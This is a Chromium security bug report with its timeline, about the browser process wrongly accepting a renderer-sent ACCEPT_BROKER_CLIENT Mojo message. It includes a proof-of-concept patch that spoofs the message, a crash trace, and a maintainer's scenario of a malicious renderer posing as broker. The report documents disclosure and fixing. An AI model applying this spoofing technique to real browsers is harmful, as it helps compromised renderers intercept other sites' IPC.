# Security: The Browser Process wrongly handle ACCEPT_BROKER_CLIENT message

| Field | Value |
|-------|-------|
| **Issue ID** | [40055423](https://issues.chromium.org/issues/40055423) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Mojo>Core |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hi...@gmail.com |
| **Assignee** | ro...@google.com |
| **Created** | 2021-04-02 |
| **Bounty** | $15,000.00 |

## Description

ACCEPT_BROKER_CLIENT should have been a message sending from browser process to renderer process, but browser process wrongly
handle this message when the render process send to it.

In the beginning of the function OnAcceptBrokerClient, there is a DCHECK to ensure broker process(browser process) doesn't handle this process, maybe
we should change it to

```
if(!GetConfiguration().is_broker_process)
    return;
```

void NodeController::OnAcceptBrokerClient(const ports::NodeName& from_node,
                                          const ports::NodeName& broker_name,
                                          PlatformHandle broker_channel,
                                          const uint64_t broker_capabilities) {
  DCHECK(!GetConfiguration().is_broker_process);                #################this DCHECK can be trigger browser crash from a compromised renderer process

  // This node should already have an inviter in bootstrap mode.
  ports::NodeName inviter_name;
  scoped_refptr<NodeChannel> inviter;
  {
    base::AutoLock lock(inviter_lock_);
    inviter_name = inviter_name_;
    inviter = bootstrap_inviter_channel_;
    bootstrap_inviter_channel_ = nullptr;
  }
  DCHECK(inviter_name == from_node);
  DCHECK(inviter);

  base::queue<ports::NodeName> pending_broker_clients;
  std::unordered_map<ports::NodeName, OutgoingMessageQueue>
      pending_relay_messages;
  {
    base::AutoLock lock(broker_lock_);
    broker_name_ = broker_name;
    std::swap(pending_broker_clients, pending_broker_clients_);
    std::swap(pending_relay_messages, pending_relay_messages_);
  }
  DCHECK(broker_name != ports::kInvalidNodeName);

To reproduce the issue, please patch chrome through the following patch

```c++
diff --git a/mojo/core/node_channel.cc b/mojo/core/node_channel.cc
index c48fb573fea9..f4389b01ca72 100644
--- a/mojo/core/node_channel.cc
+++ b/mojo/core/node_channel.cc
@@ -17,7 +17,9 @@
 #include "mojo/core/configuration.h"
 #include "mojo/core/core.h"
 #include "mojo/core/request_context.h"
-
+#include "base/trace_event/trace_event.h"
+#include "mojo/public/cpp/platform/platform_channel.h"
+#include "base/sync_socket.h"
 namespace mojo {
 namespace core {
 
@@ -327,12 +329,31 @@ void NodeChannel::AcceptInvitee(const ports::NodeName& inviter_name,
 
 void NodeChannel::AcceptInvitation(const ports::NodeName& token,
                                    const ports::NodeName& invitee_name) {
-  AcceptInvitationData* data;
-  Channel::MessagePtr message = CreateMessage(
-      MessageType::ACCEPT_INVITATION, sizeof(AcceptInvitationData), 0, &data);
-  data->token = token;
-  data->invitee_name = invitee_name;
-  WriteChannelMessage(std::move(message));
+  if (base::trace_event::TraceLog::GetInstance()->process_name() ==
+      "Renderer") {
+    AcceptBrokerClientData* data;
+    std::vector<PlatformHandle> handles;
+
+    //PlatformChannel temp_channel;
+    base::SyncSocket socket1, socket2;
+    base::SyncSocket::CreatePair(&socket1, &socket2);
+    handles.emplace_back(  mojo::PlatformHandle(socket1.Take()) );
+
+    Channel::MessagePtr message =
+        CreateMessage(MessageType::ACCEPT_BROKER_CLIENT,
+                      sizeof(AcceptBrokerClientData), handles.size(), &data);
+    message->SetHandles(std::move(handles));
+    data->broker_name = invitee_name;
+    WriteChannelMessage(std::move(message));
+  } else {
+    AcceptInvitationData* data;
+    Channel::MessagePtr message = CreateMessage(
+        MessageType::ACCEPT_INVITATION, sizeof(AcceptInvitationData), 0,
+        &data);
+    data->token = token;
+    data->invitee_name = invitee_name;
+    WriteChannelMessage(std::move(message));
+  }
 }
 
 void NodeChannel::AcceptPeer(const ports::NodeName& sender_name,
```

build a debug version chrome , run chrome and the following crash will occur

[2873396:2873410:0402/180638.720412:FATAL:node_controller.cc(944)] Check failed: !GetConfiguration().is_broker_process. 
#0 0x7f38123f499f base::debug::CollectStackTrace()
#1 0x7f38121839da base::debug::StackTrace::StackTrace()
#2 0x7f3812183995 base::debug::StackTrace::StackTrace()
#3 0x7f38121cf639 logging::LogMessage::~LogMessage()
#4 0x7f38121cfd69 logging::LogMessage::~LogMessage()
#5 0x7f38121436ab logging::CheckError::~CheckError()
#6 0x7f37d08063cc mojo::core::NodeController::OnAcceptBrokerClient()
#7 0x7f37d07fcf03 mojo::core::NodeChannel::OnChannelMessage()
#8 0x7f37d07c6609 mojo::core::Channel::TryDispatchMessage()
#9 0x7f37d07c5de3 mojo::core::Channel::OnReadComplete()
#10 0x7f37d084728a mojo::core::ChannelPosix::OnFileCanReadWithoutBlocking()
#11 0x7f381248369b base::MessagePumpLibevent::FdWatchController::OnFileCanReadWithoutBlocking()
#12 0x7f3812484c4e base::MessagePumpLibevent::OnLibeventNotification()
#13 0x7f3812556757 event_process_active
#14 0x7f3812555d03 event_base_loop
#15 0x7f3812484fdd base::MessagePumpLibevent::Run()
#16 0x7f38123449d0 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run()
#17 0x7f3812293a72 base::RunLoop::Run()
#18 0x7f38123af135 base::Thread::Run()
#19 0x7f380945aecc content::BrowserProcessSubThread::IOThreadRun()
#20 0x7f380945adbc content::BrowserProcessSubThread::Run()
#21 0x7f38123af62a base::Thread::ThreadMain()
#22 0x7f381242be9b base::(anonymous namespace)::ThreadFunc()
#23 0x7f37db99c609 start_thread
#24 0x7f37db14b293 clone

Received signal 6
#0 0x7f38123f499f base::debug::CollectStackTrace()
#1 0x7f38121839da base::debug::StackTrace::StackTrace()
#2 0x7f3812183995 base::debug::StackTrace::StackTrace()
#3 0x7f38123f446b base::debug::(anonymous namespace)::StackDumpSignalHandler()
#4 0x7f37db9a83c0 (/usr/lib/x86_64-linux-gnu/libpthread-2.31.so+0x153bf)
#5 0x7f37db06f18b gsignal
#6 0x7f37db04e859 abort
#7 0x7f38123f3aa6 base::debug::(anonymous namespace)::DebugBreak()
#8 0x7f38123f3a85 base::debug::BreakDebugger()
#9 0x7f38121cfc2c logging::LogMessage::~LogMessage()
#10 0x7f38121cfd69 logging::LogMessage::~LogMessage()
#11 0x7f38121436ab logging::CheckError::~CheckError()
#12 0x7f37d08063cc mojo::core::NodeController::OnAcceptBrokerClient()
#13 0x7f37d07fcf03 mojo::core::NodeChannel::OnChannelMessage()
#14 0x7f37d07c6609 mojo::core::Channel::TryDispatchMessage()
#15 0x7f37d07c5de3 mojo::core::Channel::OnReadComplete()
#16 0x7f37d084728a mojo::core::ChannelPosix::OnFileCanReadWithoutBlocking()
#17 0x7f381248369b base::MessagePumpLibevent::FdWatchController::OnFileCanReadWithoutBlocking()
#18 0x7f3812484c4e base::MessagePumpLibevent::OnLibeventNotification()
#19 0x7f3812556757 event_process_active
#20 0x7f3812555d03 event_base_loop
#21 0x7f3812484fdd base::MessagePumpLibevent::Run()
#22 0x7f38123449d0 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run()
#23 0x7f3812293a72 base::RunLoop::Run()
#24 0x7f38123af135 base::Thread::Run()
#25 0x7f380945aecc content::BrowserProcessSubThread::IOThreadRun()
#26 0x7f380945adbc content::BrowserProcessSubThread::Run()
#27 0x7f38123af62a base::Thread::ThreadMain()
#28 0x7f381242be9b base::(anonymous namespace)::ThreadFunc()
#29 0x7f37db99c609 start_thread
#30 0x7f37db14b293 clone
  r8: 0000000000000000  r9: 00007f37c72c4390 r10: 0000000000000008 r11: 0000000000000246
 r12: 00007ffd655f1ece r13: 00007ffd655f1ecf r14: 00007ffd655f2120 r15: 00007f37c72c7840
  di: 0000000000000002  si: 00007f37c72c4390  bp: 00007f37c72c45e0  bx: 00007f37c72c8700
  dx: 0000000000000000  ax: 0000000000000000  cx: 00007f37db06f18b  sp: 00007f37c72c4390
  ip: 00007f37db06f18b efl: 0000000000000246 cgf: 002b000000000033 erf: 0000000000000000
 trp: 0000000000000000 msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]
Calling _exit(1). Core file will not be generated.

Maybe a state machine should be added to handle different types of messages 


## Timeline

### [Deleted User] (2021-04-02)

[Empty comment from Monorail migration]

### dr...@chromium.org (2021-04-05)

Thanks for the report! I can confirm the patch works as expected, but this is deep enough in the Mojo internals that I'm not clear what the security implications of this DCHECK failure are. Adding some Mojo owners for comment.

rsesek@, rockot@ - is it plausible that a compromised renderer could send such a message? Are there any security implications to the browser process accepting it?

[Monorail components: Internals>Mojo>Core]

### ro...@google.com (2021-04-05)

It is plausible for a compromised renderer to send such a message. I agree we should not be DCHECKing, and actually we should attempt to kill any process that sends this message to the broker.

I also think it is a real vulnerability. Example scenario:

1. Browser launches new renderer for bank.com and invites it to join.
2. Renderer for evil.com sends browser ACCEPT_BROKER_CLIENT, establishing itself as the browser's "broker"
3. Browser receives ACCEPT_INVITATION from bank.com's renderer
4. Browser adds bank.com to the network by passing it along to its (evil and fake) "broker", thanks to this line of code [1]

Now that code should probably be checking is_broker_process as well, but rejecting on the original unexpected ACCEPT_BROKER_CLIENT would still be sufficient to prevent this from happening.

[1] https://source.chromium.org/chromium/chromium/src/+/master:mojo/core/node_controller.cc;drc=12b581a3dd36c0023279db86996c041c312edc61;l=856

### dr...@chromium.org (2021-04-05)

Perfect, thanks! That sounds like a high severity to me, since it requires a compromised renderer.

### [Deleted User] (2021-04-06)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ro...@google.com (2021-04-06)

I can take this btw

### gi...@appspot.gserviceaccount.com (2021-04-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/a32b061fc92cc3864d036ffb8c22c12b05202589

commit a32b061fc92cc3864d036ffb8c22c12b05202589
Author: Ken Rockot <rockot@google.com>
Date: Wed Apr 07 15:15:33 2021

Mojo: Remove some inappropriate DCHECKs

There are a few places where we DCHECK conditions that cannot be
reliably asserted since they depend on untrusted inputs. These are
replaced with logic to conditionally terminate the connection to the
offending peer process.

Fixed: 1195333
Change-Id: I0c6873bf55d6b0b1d0cbb3c2e5b256e1a57ff696
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2808893
Reviewed-by: Robert Sesek <rsesek@chromium.org>
Commit-Queue: Ken Rockot <rockot@google.com>
Cr-Commit-Position: refs/heads/master@{#870007}

[modify] https://crrev.com/a32b061fc92cc3864d036ffb8c22c12b05202589/mojo/core/node_controller.cc


### [Deleted User] (2021-04-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-07)

Requesting merge to stable M89 because latest trunk commit (870007) appears to be after stable branch point (843830).

Requesting merge to beta M90 because latest trunk commit (870007) appears to be after beta branch point (857950).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-04-07)

This bug requires manual review: We are only 5 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), cindyb@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2021-04-07)

+adetayloe@ for M90 merge review. CL listed at #7 landed 3 hrs back not in canary yet. 

### ad...@chromium.org (2021-04-07)

Approving merge to M90, branch 4430, *BUT* please wait for 24 hours canary coverage first. It's likely that this will miss the first M90 release and end up in the first security refresh, and that's OK.

### [Deleted User] (2021-04-12)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2021-04-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/ec12801c0f183919d4232e4fd2532e76345e0619

commit ec12801c0f183919d4232e4fd2532e76345e0619
Author: Ken Rockot <rockot@google.com>
Date: Mon Apr 12 16:54:38 2021

Mojo: Remove some inappropriate DCHECKs

There are a few places where we DCHECK conditions that cannot be
reliably asserted since they depend on untrusted inputs. These are
replaced with logic to conditionally terminate the connection to the
offending peer process.

(cherry picked from commit a32b061fc92cc3864d036ffb8c22c12b05202589)

Fixed: 1195333
Change-Id: I0c6873bf55d6b0b1d0cbb3c2e5b256e1a57ff696
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2808893
Reviewed-by: Robert Sesek <rsesek@chromium.org>
Commit-Queue: Ken Rockot <rockot@google.com>
Cr-Original-Commit-Position: refs/heads/master@{#870007}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2821592
Commit-Queue: Robert Sesek <rsesek@chromium.org>
Auto-Submit: Ken Rockot <rockot@google.com>
Cr-Commit-Position: refs/branch-heads/4430@{#1226}
Cr-Branched-From: e5ce7dc4f7518237b3d9bb93cccca35d25216cbe-refs/heads/master@{#857950}

[modify] https://crrev.com/ec12801c0f183919d4232e4fd2532e76345e0619/mojo/core/node_controller.cc


### ad...@google.com (2021-04-12)

[Empty comment from Monorail migration]

### ja...@google.com (2021-04-13)

[Empty comment from Monorail migration]

### gi...@google.com (2021-04-13)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-15)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-04-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/012e9baf46c9867c139f595b073be642743d933a

commit 012e9baf46c9867c139f595b073be642743d933a
Author: Jana Grill <janagrill@google.com>
Date: Thu Apr 15 20:49:42 2021

Mojo: Remove some inappropriate DCHECKs

There are a few places where we DCHECK conditions that cannot be
reliably asserted since they depend on untrusted inputs. These are
replaced with logic to conditionally terminate the connection to the
offending peer process.

(cherry picked from commit a32b061fc92cc3864d036ffb8c22c12b05202589)

Fixed: 1195333
Change-Id: I0c6873bf55d6b0b1d0cbb3c2e5b256e1a57ff696
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2808893
Reviewed-by: Robert Sesek <rsesek@chromium.org>
Commit-Queue: Ken Rockot <rockot@google.com>
Cr-Original-Commit-Position: refs/heads/master@{#870007}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2821958
Reviewed-by: Achuith Bhandarkar <achuith@chromium.org>
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>
Commit-Queue: Achuith Bhandarkar <achuith@chromium.org>
Owners-Override: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/4240@{#1608}
Cr-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}

[modify] https://crrev.com/012e9baf46c9867c139f595b073be642743d933a/mojo/core/node_controller.cc


### ja...@google.com (2021-04-16)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-20)

[Empty comment from Monorail migration]

### am...@google.com (2021-04-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-04-23)

And another one! Congratulations, higongguang@! The VRP Panel has decided to award you $15,000 for this report, too. Nice finding!

### am...@google.com (2021-04-26)

[Empty comment from Monorail migration]

### am...@google.com (2021-04-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1195333?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055423)*
